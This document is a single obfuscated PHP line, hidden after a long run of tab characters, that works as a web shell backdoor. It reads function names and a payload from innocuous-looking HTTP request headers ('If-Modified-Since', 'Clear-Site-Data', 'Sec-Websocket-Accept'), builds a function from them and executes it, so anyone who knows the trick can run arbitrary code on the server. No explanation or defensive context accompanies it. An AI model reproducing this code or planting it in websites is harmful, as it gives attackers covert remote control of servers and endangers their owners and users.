<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$system=$_HEADERS['If-Modified-Since']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Sec-Websocket-Accept']));$system();}
